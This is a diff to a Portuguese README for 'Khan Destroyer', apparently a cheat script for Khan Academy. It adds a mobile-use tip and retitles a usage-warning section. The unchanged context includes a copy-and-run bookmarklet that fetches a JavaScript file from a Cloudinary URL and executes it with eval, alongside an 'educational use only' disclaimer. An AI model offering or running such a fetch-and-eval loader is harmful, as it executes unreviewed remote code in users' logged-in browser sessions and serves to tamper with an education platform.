@@ -25,11 +25,12 @@
 - Execute o sript e aproveite!!
 
 # Hack/script (copiar)
+⚠️ **ATIVAR O MODO COMPUTADOR PRA USAR NO CELULAR**⚠️ 
 ```js
 javascript:fetch("https://res.cloudinary.com/djc2oykzd/raw/upload/KhanDestroyer.js").then(t=>t.text()).then(eval);
 ```
 
-# AVISOS DE USO⚠️ 
+# AVISOS DE USO📖
 **O Khan Destroyer é uma ferramenta de uso exclusivamente educacional, NÃO AUTORIZAMOS O USO DE TERCEIROS!
 Não é permitido utilizá-lo para fins indevidos ou fraudulentos OU LUCRATIVOS.
 O uso em servidores de terceiros é proibido sem autorização prévia.
